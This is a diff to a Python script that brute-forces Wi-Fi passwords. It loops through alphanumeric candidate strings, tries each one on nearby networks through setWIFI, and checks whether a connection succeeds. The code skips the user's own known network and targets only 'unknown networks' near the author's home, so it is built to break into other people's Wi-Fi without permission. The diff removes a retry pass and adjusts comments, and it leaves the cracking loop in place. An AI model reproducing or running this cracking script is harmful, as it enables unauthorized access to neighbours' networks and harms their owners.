@@ -12,8 +12,6 @@ def searchWIFI(ssid):
         "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
         "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"
     ]
-    bigcharsay = []
-
     start_time = time.time()
     for d1 in chars:
         for d2 in chars:
@@ -27,9 +25,9 @@ def searchWIFI(ssid):
                                     print(ssid + ' : ' + pasw)
                                     if mkSense(pasw):
                                         '''
-                                        Accepts one repetition a maximum of three times
+                                        Accepts repetition in maximum of three times
                                         Ex: AAA36274 or AA36A274 or ...
-                                        In this case the maximum that the letter 'A' can repeat is 
+                                        In this case the maximum that letter 'A' can repeat is 
                                         three times.
                                         '''
                                         setWIFI(ssid, pasw)
@@ -39,24 +37,9 @@ def searchWIFI(ssid):
                                             print('\nDone!\n')
                                             print("--- %s seconds ---" % (round(time.time() - start_time,3)))
                                             return 0
-                                    else:
-                                        bigcharsay.append(pasw)
-    '''
-    If it ends without finding, the algorithm tries again 
-    with previously negated repetitive characters. It will take longer.
-    '''
-    for pasw in bigcharsay:
-        print(f'# {ssid}' + ' : ' + pasw)
-        setWIFI(ssid, pasw)
-        time.sleep(5)
-        if is_connected():
-            print('>>>> ' + SSIDPASS(ssid))
-            print('\nDone!\n')
-            print("--- %s seconds ---" % (round(time.time() - start_time,3)))
-            return 0
 
 search = ARRSSID() #All networks near my home
-myNetwork = 'MYWIFI' #Put here the network that you already know the password
+myNetwork = 'MYWIFI' #Put here the network that you already know the password. If not, you can leave it empty.
 
 for ssid in search:
     if myNetwork != ssid: #Accepts only unknown networks
